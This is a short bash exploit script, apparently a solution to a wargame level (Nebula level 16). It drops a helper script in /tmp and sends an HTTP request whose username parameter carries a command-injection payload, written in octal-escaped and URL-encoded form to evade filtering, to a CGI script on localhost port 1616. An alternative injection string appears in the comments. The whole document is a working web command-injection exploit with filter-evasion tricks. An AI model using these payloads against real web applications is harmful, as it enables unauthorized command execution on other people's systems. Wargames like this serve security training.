#!/bin/bash
##
# command injection via encoded url
# runs command: make -f /tmp/makefile
# injects `/tmp/run.sh` as `/$'\164\155\160'/$'\162\165\156'.$'\163\150'`
# in octal don't you know :).
#
# we could have used:
#  "</dev/null;X=/tmp/run.sh;${X,,};# as %22%3C%2Fdev%2Fnull%3BX%3D%2Ftmp%2Frun.sh%3B%24%7BX%2C%2C%7D%3B%23
# reference: http://kroosec.blogspot.co.uk/2012/11/wargame-exploit-exercises-nebula-level16.html
# although i prefer mine, as i came up with it :)
##
source ./levelXX.sh
echo -e "#!/bin/bash\nmake -f /tmp/makefile" > /tmp/run.sh
chmod +x /tmp/run.sh
#echo -e "GET /index.cgi?username=%22%3C%2Fdev%2Fnull%3BX%3D%2Ftmp%2Frun.sh%3B%24%7BX%2C%2C%7D%3B%23" | \
echo -e "GET /index.cgi?username=%60%2F%24'%5C164%5C155%5C160'%2F%24'%5C162%5C165%5C156'.%24'%5C163%5C150'%60" | \
  nc 127.0.0.1 1616 > /dev/null 2> /dev/null
rm /tmp/run.sh
